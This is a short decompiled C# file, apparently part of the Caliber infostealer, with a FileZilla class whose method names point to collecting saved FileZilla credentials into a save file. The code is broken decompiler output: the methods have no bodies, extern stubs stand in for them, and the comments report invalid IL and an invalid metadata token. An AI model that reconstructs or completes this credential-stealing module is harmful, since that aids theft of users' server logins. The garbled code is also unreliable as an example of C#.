using System.Runtime.InteropServices;
using System.Text;

namespace youknowcaliber;

internal class FileZilla
{
	private static StringBuilder SB;

	public static readonly string FzPath;

	public static extern void GetFileZilla();

	public static void GetDataFileZilla(string PathFZ, string SaveFile, [Optional] string RS, [Optional] string Serv)
	{
		//Discarded unreachable code: IL_0005, IL_000c, IL_0017, IL_001c, IL_0027, IL_002d
		//IL_0012: Invalid comparison between Unknown and I4
		//IL_0028: Invalid comparison between Unknown and I8
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		/*Error: Invalid metadata token*/;
	}

	public extern FileZilla();
}
